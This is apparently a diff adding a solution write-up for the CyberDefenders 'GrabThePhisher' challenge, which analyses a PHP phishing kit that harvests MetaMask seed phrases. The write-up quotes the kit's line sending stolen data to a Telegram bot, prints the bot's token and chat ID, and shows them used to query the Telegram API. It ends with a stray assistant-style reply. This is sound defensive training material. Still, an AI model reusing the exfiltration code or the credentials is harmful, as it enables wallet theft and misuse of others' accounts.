@@ -1,0 +1,118 @@
+I solved the challenge "grabthephisher" on cyberdefenders.org. In this article, I will share my solution to the puzzles.
+
+Solution
+
+1. Which wallet is used for asking the seed phrase?
+
+The website displays three wallets, and after checking the website directory structure, I found only one directory that contained a suspicious PHP script:
+
+c75-GrabThePhisher\pankewk\metamask\metamask.php
+
+2. What is the file name that has the code for the phishing kit?
+
+The sebsite directory structure contains a script file written in PHP to gather intelligence and data from the user.
+
+3. In which language was the kit written?
+
+The script is written in PHP.
+
+4. What service does the kit use to retrieve the victim’s machine information?
+
+The code of the script shows that the phisher is using the Sypex Geo service to gather intelligence:
+
+$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']);
+
+5. How many seed phrases were already collected?
+
+The script is appending data in a log file named log.txt, located in the root directory of the webpage. The file contains three seed phrases.
+
+6. Write down the seed phrase of the most recent phishing incident?
+
+Since the script is appending data to the log file using the FILE_APPEND option, the last written value written in log file will have the seed phrase.
+
+7. Which medium had been used for credential dumping?
+
+The script uses the Telegram Bot API, as seen in Line 34:
+
+$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
+
+8. What is the token for the channel?
+
+The token is stored in a variable named $token in Line 33:
+
+$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
+
+9. What is the chat ID of the phisher’s channel?
+
+The chat ID is stored in a variable named $id in Line 32:
+
+$id = "5442785564";
+
+10. What are the allies of the phish kit developer?
+
+The author of the phishing script left a message in the file, which reads:
+
+/*
+With love and respect to all the hustler out there,
+This is a small gift to my brothers,
+All the best with your luck,
+
+Regards,
+j1j1b1s@m3r0
+
+*/
+
+11. What is the full name of the Phish Actor?
+
+Since the phish actor name wasn't mentioned in the php script, i checked the Telegram Bot api which the token and channel ID.
+
+https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564
+
+How I ended on this URL is as below.
+Access the URL mentioned in the script.
+
+https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/sendMessage?chat_id=5442785564
+
+Got error as bad request method. Looked up in the Telegram Bot request method.
+
+https://core.telegram.org/bots/api
+
+Accessed as below could return results.
+
+https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getMe
+
+ok	true
+result	
+id	5457463144
+is_bot	true
+first_name	"jijibisam3robot"
+username	"jijibisam3robot"
+can_join_groups	true
+can_read_all_group_messages	false
+supports_inline_queries	false
+
+But, response didn't had any author information. Most information are Returned only in getChat
+
+Modifed the url as below
+
+https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564
+
+Results:
+
+ok	true
+result	
+id	5442785564
+first_name	"Marcus"
+last_name	"Aurelius"
+username	"pumpkinboii"
+type	"private"
+active_usernames	
+0	"pumpkinboii"
+
+Cheers!!!!
+
+You're welcome! Let me know if you have any other questions or if there's anything else I can help you with.
+
+
+
+
